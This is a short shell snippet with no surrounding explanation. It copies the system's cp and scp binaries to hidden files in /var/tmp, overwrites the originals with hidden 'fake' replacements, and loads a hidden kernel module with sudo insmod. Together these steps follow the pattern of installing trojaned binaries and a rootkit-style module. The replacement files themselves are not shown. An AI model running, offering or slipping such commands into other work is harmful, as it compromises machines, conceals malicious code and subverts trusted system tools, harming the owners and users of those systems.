cp /bin/cp /var/tmp/.cp
cp /usr/bin/scp /var/tmp/.scp
mv -f /var/tmp/.fake_cp /bin/cp
mv -f /var/tmp/.fake_scp /usr/bin/scp
sudo insmod /var/tmp/.hello.ko
